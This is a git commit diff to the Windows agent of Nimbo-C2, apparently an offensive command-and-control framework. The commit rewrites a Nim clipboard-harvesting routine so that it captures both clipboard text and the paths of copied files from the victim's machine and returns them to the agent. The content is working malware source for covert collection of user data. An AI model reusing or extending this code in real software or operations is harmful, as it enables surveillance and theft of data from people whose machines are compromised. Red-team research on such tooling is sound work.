ace0911486970e4d57c15bf009b057ec18bcd212
Itay Migdal <32266629+itaymigdal@users.noreply.github.com>
2024-10-20 13:40:45 +0300

    improved clipboard

--- Nimbo-C2/agent/windows/utils/clipboard.nim
+++ Nimbo-C2/agent/windows/utils/clipboard.nim
@@ -2,15 +2,31 @@ import std/[strutils]
 import winim
 
 proc get_clipboard*(): string =
-  # finally close
-  defer: discard CloseClipboard()
-  # try to read clipboard
-  if OpenClipboard(0):
-    let data = GetClipboardData(1)
-    if data != 0:
-      let text = cast[cstring](GlobalLock(data))
-      discard GlobalUnlock(data)
-      if text != NULL:
-        # replace bad chars
-        var sanitized_text = ($text).replace("\c", "")
-        return sanitized_text
+    defer: discard CloseClipboard()
+    
+    if OpenClipboard(0):
+        # Check for CF_TEXT
+        let textData = GetClipboardData(CF_TEXT)
+        if textData != 0:
+            let text = cast[cstring](GlobalLock(textData))
+            defer: discard GlobalUnlock(textData)
+            if text != nil:
+                return ($text).replace("\c", "")
+        
+        # Check for CF_HDROP
+        let hdropData = GetClipboardData(CF_HDROP)
+        if hdropData != 0:
+            let dropFiles = cast[HDROP](GlobalLock(hdropData))
+            defer: discard GlobalUnlock(hdropData)
+            if dropFiles != 0:
+                result = "Copied files:\n"
+                let fileCount = DragQueryFile(dropFiles, cast[UINT](0xFFFFFFFF), nil, 0)
+                var buffer: array[MAX_PATH, WCHAR]
+                for i in 0 ..< fileCount:
+                    let pathLength = DragQueryFileW(dropFiles, i, cast[LPWSTR](addr buffer[0]), MAX_PATH.UINT32)
+                    if pathLength > 0:
+                        result.add($cast[WideCString](addr buffer[0]))
+                        result.add("\n")
+                return result.strip()
+
+    return ""
